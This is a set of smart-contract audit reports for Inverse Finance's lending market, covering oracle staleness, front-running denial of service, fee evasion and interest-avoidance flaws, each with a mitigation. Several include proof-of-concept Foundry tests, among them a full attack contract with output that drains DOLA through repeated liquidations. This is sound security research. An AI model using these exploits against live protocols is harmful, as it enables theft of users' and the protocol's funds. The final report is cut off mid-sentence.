# Lines of code  https://github.com/code-423n4/2022-10-inverse/blob/main/src/Oracle.sol#L78-L105 https://github.com/code-423n4/2022-10-inverse/blob/main/src/Oracle.sol#L112-L144 https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L344-L347 https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L323-L327 https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L353-L363   # Vulnerability details  ## Impact Calling the `Oracle` contract's `viewPrice` or `getPrice` function executes `uint price = feeds[token].feed.latestAnswer()` and `require(price > 0, "Invalid feed price")`. Besides that Chainlink's `latestAnswer` function is deprecated, only verifying that `price > 0` is true is also not enough to guarantee that the returned `price` is not stale. Using a stale `price` can cause the calculations for the credit and withdrawal limits to be inaccurate, which, for example, can mistakenly consider a user's debt to be under water and unexpectedly allow the user's debt to be liquidated.  To avoid using a stale answer returned by the Chainlink oracle data feed, according to [Chainlink's documentation](https://docs.chain.link/docs/historical-price-data): 1. The `latestRoundData` function can be used instead of the deprecated `latestAnswer` function. 2. `roundId` and `answeredInRound` are also returned. "You can check `answeredInRound` against the current `roundId`. If `answeredInRound` is less than `roundId`, the answer is being carried over. If `answeredInRound` is equal to `roundId`, then the answer is fresh." 3. "A read can revert if the caller is requesting the details of a round that was invalid or has not yet been answered. If you are deriving a round ID without having observed it before, the round might not be complete. To check the round, validate that the timestamp on that round is not 0."    https://github.com/code-423n4/2022-10-inverse/blob/main/src/Oracle.sol#L78-L105 ```solidity     function viewPrice(address token, uint collateralFactorBps) external view returns (uint) {         if(fixedPrices[token] > 0) return fixedPrices[token];         if(feeds[token].feed != IChainlinkFeed(address(0))) {             // get price from feed             uint price = feeds[token].feed.latestAnswer();             require(price > 0, "Invalid feed price");             // normalize price             uint8 feedDecimals = feeds[token].feed.decimals();             uint8 tokenDecimals = feeds[token].tokenDecimals;             uint8 decimals = 36 - feedDecimals - tokenDecimals;             uint normalizedPrice = price * (10 ** decimals);             uint day = block.timestamp / 1 days;             // get today's low             uint todaysLow = dailyLows[token][day];             // get yesterday's low             uint yesterdaysLow = dailyLows[token][day - 1];             // calculate new borrowing power based on collateral factor             uint newBorrowingPower = normalizedPrice * collateralFactorBps / 10000;             uint twoDayLow = todaysLow > yesterdaysLow && yesterdaysLow > 0 ? yesterdaysLow : todaysLow;             if(twoDayLow > 0 && newBorrowingPower > twoDayLow) {                 uint dampenedPrice = twoDayLow * 10000 / collateralFactorBps;                 return dampenedPrice < normalizedPrice ? dampenedPrice: normalizedPrice;             }             return normalizedPrice;          }         revert("Price not found");     } ```  https://github.com/code-423n4/2022-10-inverse/blob/main/src/Oracle.sol#L112-L144 ```solidity     function getPrice(address token, uint collateralFactorBps) external returns (uint) {         if(fixedPrices[token] > 0) return fixedPrices[token];         if(feeds[token].feed != IChainlinkFeed(address(0))) {             // get price from feed             uint price = feeds[token].feed.latestAnswer();             require(price > 0, "Invalid feed price");             // normalize price             uint8 feedDecimals = feeds[token].feed.decimals();             uint8 tokenDecimals = feeds[token].tokenDecimals;             uint8 decimals = 36 - feedDecimals - tokenDecimals;             uint normalizedPrice = price * (10 ** decimals);             // potentially store price as today's low             uint day = block.timestamp / 1 days;             uint todaysLow = dailyLows[token][day];             if(todaysLow == 0 || normalizedPrice < todaysLow) {                 dailyLows[token][day] = normalizedPrice;                 todaysLow = normalizedPrice;                 emit RecordDailyLow(token, normalizedPrice);             }             // get yesterday's low             uint yesterdaysLow = dailyLows[token][day - 1];             // calculate new borrowing power based on collateral factor             uint newBorrowingPower = normalizedPrice * collateralFactorBps / 10000;             uint twoDayLow = todaysLow > yesterdaysLow && yesterdaysLow > 0 ? yesterdaysLow : todaysLow;             if(twoDayLow > 0 && newBorrowingPower > twoDayLow) {                 uint dampenedPrice = twoDayLow * 10000 / collateralFactorBps;                 return dampenedPrice < normalizedPrice ? dampenedPrice: normalizedPrice;             }             return normalizedPrice;          }         revert("Price not found");     } ```  https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L344-L347 ```solidity     function getCreditLimitInternal(address user) internal returns (uint) {         uint collateralValue = getCollateralValueInternal(user);         return collateralValue * collateralFactorBps / 10000;     } ```  https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L323-L327 ```solidity     function getCollateralValueInternal(address user) internal returns (uint) {         IEscrow escrow = predictEscrow(user);         uint collateralBalance = escrow.balance();         return collateralBalance * oracle.getPrice(address(collateral), collateralFactorBps) / 1 ether;     } ```  https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L353-L363 ```solidity     function getWithdrawalLimitInternal(address user) internal returns (uint) {         IEscrow escrow = predictEscrow(user);         uint collateralBalance = escrow.balance();         if(collateralBalance == 0) return 0;         uint debt = debts[user];         if(debt == 0) return collateralBalance;         if(collateralFactorBps == 0) return 0;         uint minimumCollateral = debt * 1 ether / oracle.getPrice(address(collateral), collateralFactorBps) * 10000 / collateralFactorBps;         if(collateralBalance <= minimumCollateral) return 0;         return collateralBalance - minimumCollateral;     } ```  ## Proof of Concept The following steps can occur for the described scenario. 1. Alice calls the `depositAndBorrow` function to deposit some WETH as the collateral and borrows some DOLA against the collateral. 2. Bob calls the `liquidate` function for trying to liquidate Alice's debt. Because the Chainlink oracle data feed returns an up-to-date price at this moment, the `getCreditLimitInternal` function calculates Alice's credit limit accurately, which does not cause Alice's debt to be under water. Hence, Bob's `liquidate` transaction reverts. 3. After some time, Bob calls the `liquidate` function again for trying to liquidate Alice's debt. This time, because the Chainlink oracle data feed returns a positive but stale price, the `getCreditLimitInternal` function calculates Alice's credit limit inaccurately, which mistakenly causes Alice's debt to be under water. 4. Bob's `liquidate` transaction is executed successfully so he gains some of Alice's WETH collateral. Alice loses such WETH collateral amount unexpectedly because her debt should not be considered as under water if the stale price was not used.  ## Tools Used VSCode  ## Recommended Mitigation Steps https://github.com/code-423n4/2022-10-inverse/blob/main/src/Oracle.sol#L82-L83 and https://github.com/code-423n4/2022-10-inverse/blob/main/src/Oracle.sol#L116-L117 can be updated to the following code. ```solidity             (uint80 roundId, int256 answer, , uint256 updatedAt, uint80 answeredInRound) = feeds[token].feed.latestRoundData();             require(answeredInRound >= roundId, "answer is stale");             require(updatedAt > 0, "round is incomplete");             require(answer > 0, "Invalid feed answer");              uint256 price = uint256(answer); ```
# Lines of code  https://github.com/code-423n4/2022-10-inverse/blob/main/src/Oracle.sol#L87 https://github.com/code-423n4/2022-10-inverse/blob/main/src/Oracle.sol#L121   # Vulnerability details  ## Impact  The `Oracle` contract normalizes prices in both `viewPrices` and `getPrices` functions to adjust for potential decimal differences between feed and token decimals and the expected return value.   However these functions assume that `feedDecimals` and `tokenDecimals` won't exceed 18 since the normalization calculation is `36 - feedDecimals - tokenDecimals`, or that at worst case the sum of both won't exceed 36.  This assumption should be safe for certain cases, for example WETH is 18 decimals and the ETH/USD chainlink is 8 decimals, but may cause an overflow (and a revert) for the general case, rendering the Oracle useless in these cases.  ## Proof of Concept  If `feedDecimals + tokenDecimals > 36` then the expression `36 - feedDecimals - tokenDecimals` will be negative and (due to Solidity 0.8 default checked math) will cause a revert.  ## Recommended Mitigation Steps  In case `feedDecimals + tokenDecimals` exceeds 36, then the proper normalization procedure would be to **divide** the price by `10 ** decimals`. Something like this:  ``` uint normalizedPrice;  if (feedDecimals + tokenDecimals > 36) {     uint decimals = feedDecimals + tokenDecimals - 36;     normalizedPrice = price / (10 ** decimals) } else {     uint8 decimals = 36 - feedDecimals - tokenDecimals;     normalizedPrice = price * (10 ** decimals); } ```
# Lines of code  https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L562   # Vulnerability details  ## Impact If a user wants to completely forceReplenish a borrower with deficit, the borrower or any other malicious party can front run this with a dust amount to prevent the replenish.  ## Proof of Concept ```javascript     function testForceReplenishFrontRun() public {         gibWeth(user, wethTestAmount);         gibDBR(user, wethTestAmount / 14);         uint initialReplenisherDola = DOLA.balanceOf(replenisher);          vm.startPrank(user);         deposit(wethTestAmount);         uint borrowAmount = getMaxBorrowAmount(wethTestAmount);         market.borrow(borrowAmount);         uint initialUserDebt = market.debts(user);         uint initialMarketDola = DOLA.balanceOf(address(market));         vm.stopPrank();          vm.warp(block.timestamp + 5 days);         uint deficitBefore = dbr.deficitOf(user);         vm.startPrank(replenisher);          market.forceReplenish(user,1); // front run DoS          vm.expectRevert("Amount > deficit");         market.forceReplenish(user, deficitBefore); // fails due to amount being larger than deficit                  assertEq(DOLA.balanceOf(replenisher), initialReplenisherDola, "DOLA balance of replenisher changed");         assertEq(DOLA.balanceOf(address(market)), initialMarketDola, "DOLA balance of market changed");         assertEq(DOLA.balanceOf(replenisher) - initialReplenisherDola, initialMarketDola - DOLA.balanceOf(address(market)),             "DOLA balance of market did not decrease by amount paid to replenisher");         assertEq(dbr.deficitOf(user), deficitBefore-1, "Deficit of borrower was not fully replenished");          // debt only increased by dust         assertEq(market.debts(user) - initialUserDebt, 1 * replenishmentPriceBps / 10000, "Debt of borrower did not increase by replenishment price");     } ``` This requires that the two txs end up in the same block. If they end up in different blocks the front run transaction will need to account for the increase in deficit between blocks.   ## Tools Used vscode, forge  ## Recommended Mitigation Steps Use `min(deficit,amount)` as amount to replenish 
# Lines of code  https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L566   # Vulnerability details  ## Impact Users abels to invoke `forceReplenish()` when they are on liquidation position  ## Proof of Concept On `Market.sol` ==>  `forceReplenish()` On this line  ``` uint collateralValue = getCollateralValueInternal(user); ```  `getCollateralValueInternal(user)` only return the value of the collateral  ```     function getCollateralValueInternal(address user) internal returns (uint) {         IEscrow escrow = predictEscrow(user);         uint collateralBalance = escrow.balance();         return collateralBalance * oracle.getPrice(address(collateral), collateralFactorBps) / 1 ether;  ``` So if the user have 1.5 wETH at the price of  1 ETH = 1600 USD It will return `1.5 * 1600` and this value is the real value we can’t just check it directly with the debt like this  ```  require(collateralValue >= debts[user], "Exceeded collateral value"); ``` This is no longer `over collateralized` protocol  The value needs to be multiplied by `collateralFactorBps / 10000` -  So depending on the value of `collateralFactorBps` and `liquidationFactorBps` the user could be in the liquidation position but he is able to invoke `forceReplenish()` to cover all their `dueTokensAccrued[user]` on `DBR.sol` and get more `DOLA` -  or it will lead a healthy debt to be in the liquidation position after invoking `forceReplenish()` -   ## Recommended Mitigation Steps Use `getCreditLimitInternal()` rather than `getCollateralValueInternal()`.  
# Lines of code  https://github.com/code-423n4/2022-10-inverse/blob/3e81f0f5908ea99b36e6ab72f13488bbfe622183/src/Oracle.sol#L91   # Vulnerability details  ## Impact Oracle's `viewPrice` function doesn't report a dampened price until `getPrice` is called and today's price is updated. This will impact the public read-only functions that call it: - [getCollateralValue](https://github.com/code-423n4/2022-10-inverse/blob/3e81f0f5908ea99b36e6ab72f13488bbfe622183/src/Market.sol#L312); - [getCreditLimit](https://github.com/code-423n4/2022-10-inverse/blob/3e81f0f5908ea99b36e6ab72f13488bbfe622183/src/Market.sol#L334) (calls `getCollateralValue`); - [getLiquidatableDebt](https://github.com/code-423n4/2022-10-inverse/blob/3e81f0f5908ea99b36e6ab72f13488bbfe622183/src/Market.sol#L578) (calls `getCreditLimit`); - [getWithdrawalLimit](https://github.com/code-423n4/2022-10-inverse/blob/3e81f0f5908ea99b36e6ab72f13488bbfe622183/src/Market.sol#L370).  These functions are used to get on-chain state and prepare values for write calls (e.g. calculate withdrawal amount before withdrawing or calculate a user's debt that can be liquidated before liquidating it). Thus, wrong values returned by these functions can cause withdrawal of a wrong amount or liquidation of a wrong debt or cause reverts. ## Proof of Concept ```solidity // src/test/Oracle.t.sol function test_viewPriceNoDampenedPrice_AUDIT() public {     uint collateralFactor = market.collateralFactorBps();     uint day = block.timestamp / 1 days;     uint feedPrice = ethFeed.latestAnswer();      //1600e18 price saved as daily low     oracle.getPrice(address(WETH), collateralFactor);     assertEq(oracle.dailyLows(address(WETH), day), feedPrice);      vm.warp(block.timestamp + 1 days);     uint newPrice = 1200e18;     ethFeed.changeAnswer(newPrice);     //1200e18 price saved as daily low     oracle.getPrice(address(WETH), collateralFactor);     assertEq(oracle.dailyLows(address(WETH), ++day), newPrice);      vm.warp(block.timestamp + 1 days);     newPrice = 3000e18;     ethFeed.changeAnswer(newPrice);      //1200e18 should be twoDayLow, 3000e18 is current price. We should receive dampened price here.     // Notice that viewPrice is called before getPrice.     uint viewPrice = oracle.viewPrice(address(WETH), collateralFactor);     uint price = oracle.getPrice(address(WETH), collateralFactor);     assertEq(oracle.dailyLows(address(WETH), ++day), newPrice);      assertEq(price, 1200e18 * 10_000 / collateralFactor);      // View price wasn't dampened.     assertEq(viewPrice, 3000e18); } ``` ## Tools Used Manual review ## Recommended Mitigation Steps Consider this change: ```diff --- a/src/Oracle.sol +++ b/src/Oracle.sol @@ -89,6 +89,9 @@ contract Oracle {              uint day = block.timestamp / 1 days;              // get today's low              uint todaysLow = dailyLows[token][day]; +            if(todaysLow == 0 || normalizedPrice < todaysLow) { +                todaysLow = normalizedPrice; +            }              // get yesterday's low              uint yesterdaysLow = dailyLows[token][day - 1];              // calculate new borrowing power based on collateral factor ```
# Lines of code  https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L559 https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L591   # Vulnerability details  ## Impact  For a lending pool, borrower's debt healthness can be decided by the health factor, i.e. the collateral value divided by debt. ($C/D$)  The less the health factor is, the borrower's collateral is more risky of being liquidated.  Liquidation is supposed to make the borrower healthier (by paying debts and claiming some collateral), or else continuous liquidations can follow up and this can lead to a so-called [liquidation crisis](https://medium.com/coinmonks/what-is-liquidation-in-defi-lending-and-borrowing-platforms-3326e0ba8d0).  In a normal lending protocol, borrower's debt is limited by collateral factor in any case.  For this protocol, users can force replenishment for the addresses in deficit and the replenishment increases the borrower's debt.  And in the current implementation the replenishment is limited so that the new debt is not over than the collateral value.  As we will see below, this limitation is not enough and if the borrower's debt is over some threshold (still less than collateral value), liquidation makes the borrower debt "unhealthier".  And repeating liquidation can lead to various problems and we will even show an example that the attacker can take the DOLA out of the market.  ## Proof of Concept  ### Terminology  $C_f$ - collateralFactorBps / 10000  $L_i$ - liquidationIncentiveBps / 10000  $L_{fe}$ - liquidationFeeBps / 10000  $L_{fa}$ - liquidationFactorBps / 10000  $D$ - user's debt recognized by the market  $C$ - user's collateral held by the escrow  $P$ - collateral price in DOLA, 1 collateral = $P$ DOLAs. For simplicity, assumed to be a constant.  Constraints on the parameters in the current implementation  All parameters are in range $(0,1)$ and $L_{fe}+L_i<1$.  #### Condition for liquidation  1. Debt is over the credit limit        $D>C_f  C  P$  2. Liquidation amount is limited by liquidation factor times user debt.        $x\le L_{fa}D$  #### Study  We will explore a condition when the liquidation will decrease the health factor after liquidation of $x$.  After liquidation, borrower's new debt is $D-x$ and the collateral value is $CP-x(1+L_i+L_{fe})$ (in DOLA) due to the incentives and fee.  Let us see when the new health factor can be less than the previous health factor.  $\frac {CP-x(1+L_i+L_{fe})}{D-x} < \frac {CP}{D}$  $CP<D(1+L_i+L_{fe})$  $D>\frac{CP}{1+L_i+L_{fe}}$  So if the borrower's debt is over some value depending on the collateral value and liquidation incentive and fee, liquidation of any amount will make the account unhealthier.  Note that the right hand of the above inequality is still less than the collateral value and it means one can intentionally increase an account debt via replenishment so that it is over the threshold.  Furthermore, we notice that it is even possible that the debt can be greater than the above threshold without any replenishment if $C_f>\frac {1}{1+L_i+L_{fe}}$. The example attacker is written assuming this case but considering the possible side effects of replenishment, we suggest limiting the liquidation function so that it can not decrease the health factor.  #### Example  For $C_f=0.85, L_{fe}=0.01, L_{fa}=0.5, L_i=0.18$, an attacker can take DOLA out of protocol as below. We believe that these parameters are quite realistic. For these parameters, if an attacker borrows as much as it can, then the debt becomes greater than the threshold already without any replenishment.  ```solidity // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13;  import "forge-std/Test.sol"; import "../DBR.sol"; import "../Market.sol"; import "./FiRMTest.sol";  contract Attack_2 is FiRMTest {     address operator;      function setUp() public {         vm.label(gov, "operator");         operator = gov;          collateralFactorBps = 8500;         liquidationBonusBps = 1800;         replenishmentPriceBps = 50000;          initialize(replenishmentPriceBps, collateralFactorBps, replenishmentIncentiveBps, liquidationBonusBps, callOnDepositCallback);          vm.startPrank(gov);         market.setLiquidationFeeBps(100);         market.setLiquidationFactorBps(5000);         vm.stopPrank();          vm.startPrank(chair);         fed.expansion(IMarket(address(market)), 1_000_000e18);         vm.stopPrank();     }       function getMaxForceReplenishable(address user) public view returns (uint) {         // once the debt is over the collateral value, getLiquidatableDebt might return more than what are actually in the collateral         uint256 currentDeficit = dbr.deficitOf(user);         uint256 limitByCollateralValue = 0;         if(market.getCollateralValue(user) > market.debts(user))         {             limitByCollateralValue = (market.getCollateralValue(user) - market.debts(user)) * 10000 / dbr.replenishmentPriceBps();         }          return currentDeficit <= limitByCollateralValue ? currentDeficit : limitByCollateralValue;     }      function getMaxLiquidatable(address user) public view returns (uint) {         // once the debt is over the collateral value, getLiquidatableDebt might return more than what are actually in the collateral          uint256 limitByLiquidationFactor = market.getLiquidatableDebt(user);         uint256 limitByLiquidationReward = market.getCollateralValue(user) * 10000 / (10000 + market.liquidationFeeBps() + market.liquidationIncentiveBps());          return limitByLiquidationFactor >= limitByLiquidationReward ? limitByLiquidationReward : limitByLiquidationFactor;     }      function userTotalValue(address user) public view returns (uint256) {         uint P = ethFeed.latestAnswer() / 1e18;         uint256 totalValue = DOLA.balanceOf(user) / P + WETH.balanceOf(user);         // if the collateral value is greater than the debt, the total value includes the difference because user can repay debt and claim the collateral back         if(market.getCollateralValue(user) > market.debts(user))             totalValue += (market.getCollateralValue(user) - market.debts(user))/P;         return totalValue;     }      function testAttack_2() public {         uint P = ethFeed.latestAnswer() / 1e18; // assume the price stays the same          gibWeth(user, wethTestAmount); // 10^18, 1 eth for collateral         gibDOLA(user, wethTestAmount * P); // 10^18, 1 eth in DOLA for liquidation          // block 1         vm.startPrank(user);         deposit(wethTestAmount); // collateral          uint borrowAmount = market.getCreditLimit(user); // borrow as much as it can         market.borrow(borrowAmount);          emit log_named_decimal_uint("Total value before exploit", userTotalValue(user), 18);         emit log_named_uint("B", market.debts(user));         emit log_named_uint("D", market.debts(user));         emit log_named_uint("C", market.getCollateralValue(user));         emit log_named_decimal_uint("H", market.getCollateralValue(user) * 1e18 / market.debts(user), 18);          // start liquidation         uint cycle = 1;         while(cycle < 100)         {             emit log_named_uint("Cycle", cycle);             uint256 liquidatable = getMaxLiquidatable(user);             if(liquidatable > 0)             {                 emit log("Liquidation");                 emit log_named_uint("L", liquidatable);                 market.liquidate(user, liquidatable); // liquidate as much as it can             }             else {                 emit log("Wait a block and force replenishment");                 vm.warp(block.timestamp + 1);                 uint256 replenishable = getMaxForceReplenishable(user);                 emit log_named_uint("R", replenishable); // force replenish as much as possible, this will incur some loss but will make the address liquidatable                 market.forceReplenish(user, replenishable);             }               emit log_named_uint("D", market.debts(user));             emit log_named_uint("C", market.getCollateralValue(user));             emit log_named_decimal_uint("H", market.getCollateralValue(user) * 1e18 / market.debts(user), 18);              ++ cycle;              uint256 totalValue = userTotalValue(user);             emit log_named_decimal_uint("Total value the user owns",  totalValue, 18);             if(totalValue > wethTestAmount * 2)                 break; // no need to continue, the attacker already took profit from the market         }     } }  ```  The test results are as below. We can see that the health factor is decreasing for every liquidation and this ultimately makes the debt greater than collateral value. Then the attacker's total value increases for every liquidation and finally it gets more value than the initial status.  ``` > forge test -vv --match-test testAttack_2   Total value before exploit: 2.000000000000000000   B: 1360000000000000000000   D: 1360000000000000000000   C: 1600000000000000000000   H: 1.176470588235294117   Cycle: 1   Wait a block and force replenishment   R: 43125317097919   D: 1360000215626585489595   C: 1600000000000000000000   H: 1.176470401707135551   Total value the user owns: 1.999999871971714865   Cycle: 2   Liquidation   L: 680000107813292744797   D: 680000107813292744798   C: 790799871702181636800   H: 1.162940803414271107   Total value the user owns: 1.995749871297881786   Cycle: 3   Liquidation   L: 340000053906646372399   D: 340000053906646372399   C: 386199807553272457600   H: 1.135881606828542227   Total value the user owns: 1.993624870960965247   Cycle: 4   Liquidation   L: 170000026953323186199   D: 170000026953323186200   C: 183899775478817868800   H: 1.081763213657084471   Total value the user owns: 1.992562370792506977   Cycle: 5   Liquidation   L: 85000013476661593100   D: 85000013476661593100   C: 82749759441590576000   H: 0.973526427314168978   Total value the user owns: 1.993437529480197230   Cycle: 6   Liquidation   L: 42500006738330796550   D: 42500006738330796550   C: 32174751422976931200   H: 0.757052854628338029   Total value the user owns: 1.998218780238259443   Cycle: 7   Liquidation   L: 21250003369165398275   D: 21250003369165398275   C: 6887247413670110400   H: 0.324105709256676206   Total value the user owns: 2.000609405617290549 ```  ## Tools Used  Foundry  ## Recommended Mitigation Steps  Make sure the liquidation does not decrease the health index in the function `liquidate`. With this mitigation, we also suggest limiting the debt increase in the function `forceReplenish` so that the new debt after replenish will not be over the threshold.  ```solidity function liquidate(address user, uint repaidDebt) public {     require(repaidDebt > 0, "Must repay positive debt");     uint debt = debts[user];     require(getCreditLimitInternal(user) < debt, "User debt is healthy");     require(repaidDebt <= debt * liquidationFactorBps / 10000, "Exceeded liquidation factor");      // ****************************************     uint beforeHealthFactor = getCollateralValue(user) * 1e18 / debt; // @audit remember the health factor before liquidation     // ****************************************      uint price = oracle.getPrice(address(collateral), collateralFactorBps); // collateral price in dola     uint liquidatorReward = repaidDebt * 1 ether / price; // collateral amount     liquidatorReward += liquidatorReward * liquidationIncentiveBps / 10000;     debts[user] -= repaidDebt;     totalDebt -= repaidDebt;      dbr.onRepay(user, repaidDebt);     dola.transferFrom(msg.sender, address(this), repaidDebt);     IEscrow escrow = predictEscrow(user);     escrow.pay(msg.sender, liquidatorReward);     if(liquidationFeeBps > 0) {         uint liquidationFee = repaidDebt * 1 ether / price * liquidationFeeBps / 10000;         if(escrow.balance() >= liquidationFee) {             escrow.pay(gov, liquidationFee);         }     }      // ****************************************     uint afterHealthFactor = getCollateralValue(user) * 1e18 / debts[user]; // @audit health factor after liquidation     require(afterHealthFactor >= beforeHealthFactor, "Liquidation should not decrease the health factor of the address"); // @audit new check     // ****************************************      emit Liquidate(user, msg.sender, repaidDebt, liquidatorReward); }  function forceReplenish(address user, uint amount) public {     uint deficit = dbr.deficitOf(user);     require(deficit > 0, "No DBR deficit");     require(deficit >= amount, "Amount > deficit");     uint replenishmentCost = amount * dbr.replenishmentPriceBps() / 10000;     uint replenisherReward = replenishmentCost * replenishmentIncentiveBps / 10000;     debts[user] += replenishmentCost;     uint collateralValue = getCollateralValueInternal(user);      // ****************************************     // require(collateralValue >= debts[user], "Exceeded collateral value");     require(collateralValue >= debts[user] * (1 + liquidationIncentiveBps / 10000 + liquidationFeeBps / 10000), "Debt exceeds safe collateral limit"); // @audit more strict limit     // ****************************************      totalDebt += replenishmentCost;     dbr.onForceReplenish(user, amount);     dola.transfer(msg.sender, replenisherReward);     emit ForceReplenish(user, msg.sender, amount, replenishmentCost, replenisherReward); } ```
# Lines of code  https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L605-L610   # Vulnerability details  ## Impact User can free from liquidation fee if its escrow balance less than the calculated liquidation fee.  ## Proof of Concept If the `liquidationFeeBps` is enabled, the `gov` should receive the liquidation fee. But if user's escrow balance is less than the calculated liquidation fee, `gov` got nothing. https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L605-L610  ```solidity         if(liquidationFeeBps > 0) {             uint liquidationFee = repaidDebt * 1 ether / price * liquidationFeeBps / 10000;             if(escrow.balance() >= liquidationFee) {                 escrow.pay(gov, liquidationFee);             }         } ```   ## Tools Used manual review  ## Recommended Mitigation Steps User should pay all the remaining escrow balance if the calculated liquidation fee is greater than its escrow balance.  ```solidity         if(liquidationFeeBps > 0) {             uint liquidationFee = repaidDebt * 1 ether / price * liquidationFeeBps / 10000;             if(escrow.balance() >= liquidationFee) {                 escrow.pay(gov, liquidationFee);             } else {                 escrow.pay(gov, escrow.balance());             }         } ```  
# Lines of code  https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L531   # Vulnerability details  ## Impact In `repay()` users can repay their debt. ``` function repay(address user, uint amount) public {         uint debt = debts[user];         require(debt >= amount, "Insufficient debt");         debts[user] -= amount;         totalDebt -= amount;         dbr.onRepay(user, amount);         dola.transferFrom(msg.sender, address(this), amount);         emit Repay(user, msg.sender, amount);     } ```  There is a `require` condition, that checks if the amount provided, is greater than the debt of the user. If it is, then the function reverts. This is where the vulnerability arises.  `repay` function can be frontrun by an attacker. Say an attacker pay a small amount of debt for the victim user, by frontrunning his repay transaction. Now when the victim's transaction gets executed, the `require` condition will fail, as the amount of debt is less than the amount of DOLA provided. Hence the attacker can repeat the process to DOS the victim from calling the repay function.   ## Proof of Concept  1. Victim calls repay() function to pay his debt of 500 DOLA , by providing the amount as 500 2. Now attacker saw this transaction on mempool 3. Attacker frontruns the transaction, by calling repay() with amount provided as 1 DOLA 4. Attacker's transaction get's executed first due to frontrunning, which reduces the debt of the victim user to 499 DOLA 5. Now when the victim's transaction get's executed, the debt of victim has reduced to 499 DOLA, and the amount to repay provided was 500 DOLA. Now as debt is less than the amount provided, so the require function will fail, and the victim's transaction will revert. This will prevent the victim from calling repay function  Hence an attacker can DOS the repay function for the victim user  ## Tools Used Manual review  ## Recommended Mitigation Steps Implement DOS protection
# Lines of code  https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L567   # Vulnerability details  ## Impact  A user can borrow DOLA interest-free. This requires the user to precisely manage their collateral. This issue might become especially troublesome if a Market is opened with some stablecoin as the collateral (because price fluctuations would become negligible and carefully managing collateral level would be easy).  This issue is harder to exploit (but not impossible) if `gov` takes responsibility for forcing replenishment, since `gov` has a stronger economic incentive than third parties.  ## Proof of Concept  If my calculations are correct, with the current gas prices it costs about \$5 to call `Market.forceReplenish(...)`. Thus  there is no economic incentive to do so as long as a debtor's DBR deficit is worth less than \$5/`replenishmentIncentive` so probably around \$100.  This is because replenishing cannot push a user's debt under the water (https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L567) and a user can repay their debt without having settled the DBR deficit (https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L531).  So, assuming the current prices, a user can: 1. Deposit some collateral 2. Borrow close to the maximum allowed amount of DOLA 3. Keep withdrawing or depositing collateral so that the collateral surplus does not exceed $100 (assuming current gas prices) 4. `repay()` their debt at any time in the future. 5. Withdraw all the collateral.  All this is possible with arbitrarily large DBR deficit because due to small collateral surplus at no point was it economical for a third party to `forceReplenish()` the user. If `gov` takes responsibility for `forceReplenish()`ing, the above procedure is still viable although the user has to maintain the collateral surplus at no more than around $5.  ## Tools Used  Manual review  ## Recommended Mitigation Steps  Allow replenishing to push the debt under the water and disallow repaying the debt with an outstanding DBR deficit. E.g.: ``` diff --git a/src/Market.sol b/src/Market.sol index 9585b85..d69b599 100644 --- a/src/Market.sol +++ b/src/Market.sol @@ -531,6 +531,7 @@ contract Market {      function repay(address user, uint amount) public {          uint debt = debts[user];          require(debt >= amount, "Insufficient debt"); +        require(dbr.deficitOf(user) == 0, "DBR Deficit");          debts[user] -= amount;          totalDebt -= amount;          dbr.onRepay(user, amount); @@ -563,8 +564,6 @@ contract Market {          uint replenishmentCost = amount * dbr.replenishmentPriceBps() / 10000;          uint replenisherReward = replenishmentCost * replenishmentIncentiveBps / 10000;          debts[user] += replenishmentCost; -        uint collateralValue = getCollateralValueInternal(user); -        require(collateralValue >= debts[user], "Exceeded collateral value");          totalDebt += replenishmentCost;          dbr.onForceReplenish(user, amount);          dola.transfer(msg.sender, replenisherReward); ```
# Lines of code  https://github.com/code-423n4/2022-10-inverse/blob/main/src/DBR.sol#L287   # Vulnerability details  ## Impact  While a user borrows DOLA, his debt position in the DBR contract accrues more debt over time. However, Solidity contracts cannot update their storage automatically over time; state updates must always be triggered by externally owned accounts. For this reason, the DBR contract cannot accurately represent a user's debt position in its storage at all times. Instead, the contract offers a method `accrueDueTokens` that, when called, updates the internal storage with the debts that accrued since the last update. This method is called before all critical financial operations that depend on an accurate value of the accumulated deficit in the contract's storage. On top, this method can also be invoked permissionless at any time. Suppose a borrower manages to call this function periodically and keep the time difference between updates short. In that case, a rounding error in the computation of the accrued debt can cause the expression to round down to zero. In this case, the user successfully avoided paying interest on his debt.  ## Proof of Concept  For reference, here is the affected code:  ~~~Solidity     function accrueDueTokens(address user) public {         uint debt = debts[user];         if(lastUpdated[user] == block.timestamp) return;         uint accrued = (block.timestamp - lastUpdated[user]) * debt / 365 days;         dueTokensAccrued[user] += accrued;         totalDueTokensAccrued += accrued;         lastUpdated[user] = block.timestamp;         emit Transfer(user, address(0), accrued);     } ~~~  The problem is that the function updates the `lastUpdated[user]` storage variable even when `accrued` is `0`.  ### Example  Let's assume that the last update occurred at `t_0`. Further assume that the next update occurs at `t_1` with `t_1 - t_0 = 12s`. (`12s` is the current Ethereum block time) Suppose that the user's recorded `debt` position at `t_0 is `1,000,000 wei`. Then the accrued debt formula gives us the following:  ~~~ accrued = (t_1 - t_0) * debt / 365 days         = 12          * 1,000,000 / 31,536,000         = 1,000,000 / 31,536,000         = 0 (because unsigned integer division rounds down) ~~~  ### Maximizing profit  The accrued debt formula rounds towards zero if we have `(t_1 - t_0) * debt < 365 days`. This gives us a method to compute the maximal debt that we can deposit to make the attack more efficient:  ~~~ debt_max = 365 days / 12s -1 = 2,627,999 ~~~  Notice that an attacker is not limited to these small loans. He can split a massive loan into multiple small loans, capped at 2,627,999. To borrow X tokens (where X is given in WEI), we can compute the number of needed loans as:  ~~~ #loans = X / 2,627,999 ~~~  For example, to borrow 1 DOLA:  ~~~ #loans = 10^18 / 2,627,999 = 